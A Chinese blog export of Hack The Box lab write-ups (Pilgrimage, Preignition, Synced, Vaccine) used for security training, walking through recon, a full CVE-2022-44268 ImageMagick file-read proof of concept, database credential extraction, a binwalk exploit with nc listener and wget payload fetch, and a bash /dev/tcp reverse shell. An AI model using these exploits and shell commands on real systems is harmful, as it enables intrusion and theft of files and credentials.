<li><p>80端口运行的是个文件压缩类应用，可以上传文件，存在登录及注册功能</p>
<p><img src="https://s2.loli.net/2023/07/06/QKwqlrfnc52DI3A.png" alt="image-20230630102056521"></p>
</li>
<li><p>先注册一个账号，网站可以任意注册然后直接登录</p>
<p><img src="https://s2.loli.net/2023/07/06/vuqOhtdLjk4cGiP.png" alt="image-20230630102511755"></p>
</li>
<li><p>使用dirsearch进行目录扫描，发现网站存在git泄露漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://pilgrimage.htb/</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/ALMiobx1K48UB7p.png" alt="image-20230630102711955"></p>
</li>
<li><p>下载lijiejie大神的GitHack工具，一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#工具地址</span><br><span class="line">https://github.com/lijiejie/GitHack</span><br><span class="line">#使用方法</span><br><span class="line">python GitHack.py http://pilgrimage.htb/.git</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/cL54hVrItk3sfaY.png" alt="image-20230630103409080"></p>
</li>
<li><p>泄露的git目录如下</p>
<p><img src="https://s2.loli.net/2023/07/06/mBtJ4WrLy7ZcMXz.png" alt="image-20230630103452751"></p>
</li>
<li><p>对代码进行审计，发现SQL文件路径和网站对上传文件的后缀做了严格限制</p>
<p><img src="https://s2.loli.net/2023/07/06/wDCW8yo6lGZsbIg.png" alt="image-20230630111748019"></p>
<p><img src="https://s2.loli.net/2023/07/06/8h37OgSDCEafoGL.png" alt="image-20230630103600507"></p>
</li>
<li><p>在文件目录中发现一个magick文件，使用sublimetext打开发现是二进制文件</p>
</li>
<li><p>使用file命令查看magick文件，给予其执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file magick</span><br><span class="line">chmod +x magic</span><br><span class="line">./magick</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/xRepf83obKmnz7C.png" alt="image-20230630104048564"></p>
<p><img src="https://s2.loli.net/2023/07/06/go9kUZGPtQ4sbry.png" alt="image-20230630104231061"></p>
</li>
<li><p>网上搜索ImageMagick相关漏洞，发现7.1.0-49版本存在任意文件读取漏洞（CVE-2022-44268）</p>
</li>
</ul>
<h5 id="CVE-20220-44268"><a href="#CVE-20220-44268" class="headerlink" title="CVE-20220-44268"></a>CVE-20220-44268</h5><ul>
<li><p>漏洞大致原理</p>
<p>ImageMagick解析 PNG 图像（例如，用于调整大小）时，生成的图像中可能会嵌入任意本地文件的内容（如果 ImageMagick 二进制文件有读取权限）。</p>
</li>
<li><p>漏洞POC如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/**POC参考链接</span><br><span class="line">https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-<span class="number">2022</span>-<span class="number">44268</span>/poc.py</span><br><span class="line">**/</span><br><span class="line">//POC</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stderr, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">d = zlib.decompressobj()</span><br><span class="line">e = zlib.compressobj()</span><br><span class="line">IHDR = <span class="string">b&#x27;\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">IDAT = <span class="string">b&#x27;x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_data</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    _, data = data.strip().split(<span class="string">b&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(data.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a input filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = png.Reader(filename=filename)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">        logging.info(<span class="string">&quot;chunk %s found, value = %r&quot;</span>, k.decode(), v)</span><br><span class="line">        <span class="keyword">if</span> k == <span class="string">b&#x27;zTXt&#x27;</span>:</span><br><span class="line">            name, data = v.split(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            res = parse_data(d.decompress(data[<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        sys.stdout.write(res)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">from_filename, to_filename, read_filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> to_filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a output filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(to_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(png.signature)</span><br><span class="line">        <span class="keyword">if</span> from_filename:</span><br><span class="line">            p = png.Reader(filename=from_filename)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">                <span class="keyword">if</span> k != <span class="string">b&#x27;IEND&#x27;</span>:</span><br><span class="line">                    png.write_chunk(f, k, v)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IHDR&#x27;</span>, IHDR)</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IDAT&#x27;</span>, IDAT)</span><br><span class="line"></span><br><span class="line">        png.write_chunk(f, <span class="string">b&quot;tEXt&quot;</span>, <span class="string">b&quot;profile\x00&quot;</span> + read_filename.encode())</span><br><span class="line">        png.write_chunk(f, <span class="string">b&#x27;IEND&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;POC for CVE-2022-44268&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;action&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=(<span class="string">&#x27;generate&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;input filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;output filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--read&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;target file to read&#x27;</span>, default=<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&#x27;generate&#x27;</span>:</span><br><span class="line">        write(args.<span class="built_in">input</span>, args.output, args.read)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&#x27;parse&#x27;</span>:</span><br><span class="line">        read(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.error(<span class="string">&quot;bad action&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行python文件，生成PNG图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ImageMagicPOC.py generate -o poc.png -r /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/2SGkz4xyOpJoHKI.png" alt="image-20230630110334649"></p>
</li>
<li><p>在网上首页上传poc.png文件，抓包可以看见数据包中含有poc信息。上传成功会显示图片链接</p>
<p><img src="https://s2.loli.net/2023/07/06/9gcFMwuszEPt2Ua.png" alt="image-20230630110541833"></p>
<p><img src="https://s2.loli.net/2023/07/06/M25PmiYXEbwgedL.png" alt="image-20230630110620478"></p>
</li>
<li><p>curl图片保存到本地，使用POC文件查看图片内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://pilgrimage.htb/shrunk/649e46888cb73.png --output result.png</span><br><span class="line">python ImageMagicPOC.py parse -i result.png</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/Tm7HpM9GKAB1aXC.png" alt="image-20230630110955045"></p>
</li>
<li><p>整理得到的用户列表文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">emily:x:1000:1000:emily,,,:/home/emily:/bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p>尝试使用POC读取SQL文件，因为编码问题会产生报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ImageMagicPOC.py generate -o poc.png -r /var/db/pilgrimage</span><br></pre></td></tr></table></figure>
</li>
<li><p>更换其他POC，下载地址和使用方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载地址</span><br><span class="line">https://github.com/kljunowsky/CVE-2022-44268</span><br><span class="line">#使用方法，先复制一张图片到文件夹下，例如test.png</span><br><span class="line">#生成POC</span><br><span class="line">python3 CVE-2022-44268.py --image test.png --file-to-read /var/db/pilgrimage --output POC.png</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改python脚本内容，并获取db文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#修改解码方式</span><br><span class="line">decrypted_profile_type = raw_profile_type_stipped</span><br><span class="line">#获取db数据，保存到SQL文件中</span><br><span class="line">python3 CVE-2022-44268.py --url http://xxxx.com/xxx.png</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/wHTJPtjVrKgal5W.png" alt="image-20230702213946641"></p>
</li>
<li><p>使用xxd转换编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat dump.sql | xxd -r -p - &gt; sqlite.sql</span><br></pre></td></tr></table></figure>
</li>
<li><p>sqlite3打开SQL文件，搜索user相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite3 sqlite.sql</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/zY2N7mKPeQ1OcD5.png" alt="image-20230702215307566"></p>
</li>
<li><p>拿到emily的密码，结合获取到的passwd文件。尝试用ssh连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh emily@10.129.159.44</span><br><span class="line">#密码</span><br><span class="line">abigchonkyboi123</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/BKXQsalw9OJDGvh.png" alt="image-20230702215442036"></p>
</li>
<li><p>拿到user的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / type f -name user.* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/I8pvWEGUx6tdsLC.png" alt="image-20230702221354560"></p>
</li>
</ul>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><ul>
<li><p>使用ps或者上传pspy查看系统进程，看到有一个sh脚本</p>
<p><img src="https://s2.loli.net/2023/07/06/9vuUw4EOTbqiHY2.png" alt="image-20230702221920319"></p>
</li>
<li><p>查看sh脚本，发现binwalk关键字</p>
<p><img src="https://s2.loli.net/2023/07/06/EAsaVjzvQBNipuI.png" alt="image-20230702221956736"></p>
</li>
<li><p>使用searchsploit搜索binwalk相关漏洞</p>
<p><img src="https://s2.loli.net/2023/07/06/7fMFGZomrzb36tQ.png" alt="image-20230702222043113"></p>
</li>
<li><p>将脚本拷贝到本文件夹下，使用方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#复制一张png图片到脚本所在文件夹</span><br><span class="line">#生成poc</span><br><span class="line">python 51249.py  /home/zpast0r/sectools/Binwalk/image.png 10.10.14.12 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/aSB2sEdWRf4AxI6.png" alt="image-20230702222216984"></p>
</li>
<li><p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/5intXhxaYdDPFMA.png" alt="image-20230702222308640"></p>
</li>
<li><p>本机开启监听，在靶机上使用wget下载后门png</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#本机</span><br><span class="line">nc -lvvp 4444</span><br><span class="line">#靶机</span><br><span class="line">wget http://10.10.14.12/binwalk_exploit.png</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/hFCJ75qSpOZfnA4.png" alt="image-20230702222451904"></p>
</li>
<li><p>获取到shell</p>
<p><img src="https://s2.loli.net/2023/07/06/sTuwt3DQfAnBciI.png" alt="image-20230702222516568"></p>
</li>
<li><p>获取到root的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / tyep f -name root.* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/jSBGzO6UmILw17r.png" alt="image-20230702222635960"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Preignition</title>
    <url>/2023/07/06/HTB-Preignition/</url>
    <content><![CDATA[<h5 id="一、目录暴力破解是一种用于检查-Web-服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i）-本地文件包含，（ii）-目录破坏，（iii）-哈希破解。"><a href="#一、目录暴力破解是一种用于检查-Web-服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i）-本地文件包含，（ii）-目录破坏，（iii）-哈希破解。" class="headerlink" title="一、目录暴力破解是一种用于检查 Web 服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i） 本地文件包含，（ii） 目录破坏，（iii） 哈希破解。"></a>一、目录暴力破解是一种用于检查 Web 服务器上的大量路径以查找隐藏页面的技术。这是另一个名字？（i） 本地文件包含，（ii） 目录破坏，（iii） 哈希破解。</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">目录破坏</span></span><br><span class="line">dirbusting</span><br></pre></td></tr></table></figure>

<h5 id="二、使用什么命令让nmap扫描版本？"><a href="#二、使用什么命令让nmap扫描版本？" class="headerlink" title="二、使用什么命令让nmap扫描版本？"></a>二、使用什么命令让nmap扫描版本？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-sV</span><br></pre></td></tr></table></figure>

<h5 id="三、Nmap-报告哪些服务被标识为在端口-80-x2F-tcp-上运行？"><a href="#三、Nmap-报告哪些服务被标识为在端口-80-x2F-tcp-上运行？" class="headerlink" title="三、Nmap 报告哪些服务被标识为在端口 80&#x2F;tcp 上运行？"></a>三、Nmap 报告哪些服务被标识为在端口 80&#x2F;tcp 上运行？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http</span><br></pre></td></tr></table></figure>

<h5 id="四、端口-80-x2F-tcp-上运行的服务名称和版本是什么？"><a href="#四、端口-80-x2F-tcp-上运行的服务名称和版本是什么？" class="headerlink" title="四、端口 80&#x2F;tcp 上运行的服务名称和版本是什么？"></a>四、端口 80&#x2F;tcp 上运行的服务名称和版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx 1.14.2</span><br></pre></td></tr></table></figure>

<h5 id="五、我们使用什么开关来指定要专门执行目录破坏的-Gobuster？"><a href="#五、我们使用什么开关来指定要专门执行目录破坏的-Gobuster？" class="headerlink" title="五、我们使用什么开关来指定要专门执行目录破坏的 Gobuster？"></a>五、我们使用什么开关来指定要专门执行目录破坏的 Gobuster？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali中使用gobuster -h</span></span><br><span class="line">dir</span><br></pre></td></tr></table></figure>

<h5 id="六、当使用-gobuster-来目录爆破时，我们添加什么开关来确保它找到-PHP-页面？"><a href="#六、当使用-gobuster-来目录爆破时，我们添加什么开关来确保它找到-PHP-页面？" class="headerlink" title="六、当使用 gobuster 来目录爆破时，我们添加什么开关来确保它找到 PHP 页面？"></a>六、当使用 gobuster 来目录爆破时，我们添加什么开关来确保它找到 PHP 页面？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-x php</span><br></pre></td></tr></table></figure>

<h5 id="七、在我们的目录破坏活动中发现了什么页面？"><a href="#七、在我们的目录破坏活动中发现了什么页面？" class="headerlink" title="七、在我们的目录破坏活动中发现了什么页面？"></a>七、在我们的目录破坏活动中发现了什么页面？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用gobuster扫描页面</span></span><br><span class="line">gobuster dir -u http://10.129.223.241/ -w /usr/share/wordlists/dirb/comment.txt</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/5IO2QVzoKBgjUiY.png" alt="image-20230309171931801"></p>
<h5 id="八、Gobuster-为发现的页面报告的-HTTP-状态代码是什么？"><a href="#八、Gobuster-为发现的页面报告的-HTTP-状态代码是什么？" class="headerlink" title="八、Gobuster 为发现的页面报告的 HTTP 状态代码是什么？"></a>八、Gobuster 为发现的页面报告的 HTTP 状态代码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">200</span><br></pre></td></tr></table></figure>

<h5 id="九、提交flag"><a href="#九、提交flag" class="headerlink" title="九、提交flag"></a>九、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问admin.php页面，是个登录页面</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行爆破，账户和密码位admin</span></span><br><span class="line">6483bee07c1c1d57f14e5b0717503c73</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/Z4ILPCX6HUk18mT.png" alt="image-20230309172554120"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Synced</title>
    <url>/2023/07/06/HTB-Synced/</url>
    <content><![CDATA[<h5 id="一、rsync-的默认端口是什么？"><a href="#一、rsync-的默认端口是什么？" class="headerlink" title="一、rsync 的默认端口是什么？"></a>一、rsync 的默认端口是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">nmap -sV -sC IP</span><br><span class="line">873</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/mwheq6RN75AfHoT.png" alt="image-20230310092009734"></p>
<h5 id="二、远程主机上打开了多少个-TCP-端口？"><a href="#二、远程主机上打开了多少个-TCP-端口？" class="headerlink" title="二、远程主机上打开了多少个 TCP 端口？"></a>二、远程主机上打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h5 id="三、远程计算机上的-rsync-使用的协议版本是什么？"><a href="#三、远程计算机上的-rsync-使用的协议版本是什么？" class="headerlink" title="三、远程计算机上的 rsync 使用的协议版本是什么？"></a>三、远程计算机上的 rsync 使用的协议版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描IP</span></span><br><span class="line">31</span><br></pre></td></tr></table></figure>

<h5 id="四、Linux-上与-rsync-交互的最常见命令名称是什么？"><a href="#四、Linux-上与-rsync-交互的最常见命令名称是什么？" class="headerlink" title="四、Linux 上与 rsync 交互的最常见命令名称是什么？"></a>四、Linux 上与 rsync 交互的最常见命令名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rsync</span><br></pre></td></tr></table></figure>

<h5 id="五、您必须向-rsync-传递哪些凭据才能使用匿名身份验证？anonymous-anonymous-anonymous-None-rsync-rsync"><a href="#五、您必须向-rsync-传递哪些凭据才能使用匿名身份验证？anonymous-anonymous-anonymous-None-rsync-rsync" class="headerlink" title="五、您必须向 rsync 传递哪些凭据才能使用匿名身份验证？anonymous:anonymous, anonymous, None, rsync:rsync"></a>五、您必须向 rsync 传递哪些凭据才能使用匿名身份验证？anonymous:anonymous, anonymous, None, rsync:rsync</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>

<h5 id="六、在-rsync-上仅列出共享和文件的选项是什么？（无需包含前导-–-字符）"><a href="#六、在-rsync-上仅列出共享和文件的选项是什么？（无需包含前导-–-字符）" class="headerlink" title="六、在 rsync 上仅列出共享和文件的选项是什么？（无需包含前导 – 字符）"></a>六、在 rsync 上仅列出共享和文件的选项是什么？（无需包含前导 – 字符）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在kali中使用rsync -h</span></span><br><span class="line">--list-only</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/dBnhesaTFItgMYG.png" alt="image-20230310101117656"></p>
<h5 id="七、提交falg"><a href="#七、提交falg" class="headerlink" title="七、提交falg"></a>七、提交falg</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用rsync协议远程同步文件至本地/tmp/HTB</span></span><br><span class="line">rsync -r IP::public /tmp/HTB</span><br><span class="line">72eaf5344ebb84908ae543a719830519</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/NumfTLEkDJ7QF4O.png" alt="image-20230310101222625"></p>
<p><img src="https://s2.loli.net/2023/03/23/HA8eEWlKr7JoLUh.png" alt="image-20230310102312294"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>rsync的端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">837</span><br></pre></td></tr></table></figure>
</li>
<li><p>rsync未授权访问</p>
</li>
<li><p>rsync使用两种协议同步远程文件至本地</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SSH协议</span></span><br><span class="line">rsync -r IP:/test /tmp/HTB</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rsync协议</span></span><br><span class="line">rsync -r IP::test /tmp/HTB</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Vaccine</title>
    <url>/2023/07/06/HTB-Vaccine/</url>
    <content><![CDATA[<h5 id="一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？"><a href="#一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？" class="headerlink" title="一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？"></a>一、除了SSH和HTTP，这个盒子上还托管着什么其他服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描</span></span><br><span class="line">nmap -sV -sC 10.129.21.15 </span><br><span class="line">ftp</span><br></pre></td></tr></table></figure>

<h5 id="二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？"><a href="#二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？" class="headerlink" title="二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？"></a>二、此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描</span></span><br><span class="line">nmap -sV -sC 10.129.21.15 </span><br><span class="line">anonymouse</span><br></pre></td></tr></table></figure>

<h5 id="三、通过此服务下载的文件的名称是什么？"><a href="#三、通过此服务下载的文件的名称是什么？" class="headerlink" title="三、通过此服务下载的文件的名称是什么？"></a>三、通过此服务下载的文件的名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">backup.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/15/QEoD8Bng6zThlFd.png" alt="image-20230221154659612"></p>
<h5 id="四、-John-The-Ripper-工具集附带什么脚本，并从受密码保护的-zip-存档中生成哈希，其格式允许破解尝试？"><a href="#四、-John-The-Ripper-工具集附带什么脚本，并从受密码保护的-zip-存档中生成哈希，其格式允许破解尝试？" class="headerlink" title="四、 John The Ripper 工具集附带什么脚本，并从受密码保护的 zip 存档中生成哈希，其格式允许破解尝试？"></a>四、 John The Ripper 工具集附带什么脚本，并从受密码保护的 zip 存档中生成哈希，其格式允许破解尝试？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip2john</span><br><span class="line">zip2john xxx.zip&gt;xxx.hash</span><br></pre></td></tr></table></figure>

<h5 id="五、网站上管理员用户的密码是什么？"><a href="#五、网站上管理员用户的密码是什么？" class="headerlink" title="五、网站上管理员用户的密码是什么？"></a>五、网站上管理员用户的密码是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用john破解zip加密</span></span><br><span class="line">zip2john backup.zip &gt;&gt; passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解密码</span></span><br><span class="line">john passwd.hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示密码</span></span><br><span class="line">john passwd.hash --show</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在index.php文件找到MD5加密的密码</span></span><br><span class="line">qwerty789</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/15/h4ClLRqiu86fzwH.png" alt="image-20230222102554805"></p>
<p><img src="https://s2.loli.net/2023/03/15/t1VpoSarbecYnLl.png" alt="image-20230222102640395"></p>
<h5 id="六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？"><a href="#六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？" class="headerlink" title="六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？"></a>六、可以将哪些选项传递给sqlmap以尝试通过sql注入来执行命令？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure>

<h5 id="七、postgres用户可以使用sudo以root身份运行什么程序？"><a href="#七、postgres用户可以使用sudo以root身份运行什么程序？" class="headerlink" title="七、postgres用户可以使用sudo以root身份运行什么程序？"></a>七、postgres用户可以使用sudo以root身份运行什么程序？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure>

<h6 id="八、UserFlag"><a href="#八、UserFlag" class="headerlink" title="八、UserFlag"></a>八、UserFlag</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sqlmap --os-shell获取shell后，反弹shell到kali</span></span><br><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;1&amp;&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用find搜索文件</span></span><br><span class="line">find / type f -name user.txt</span><br><span class="line">cat /var/lib/postgresql/user.txt</span><br></pre></td></tr></table></figure>

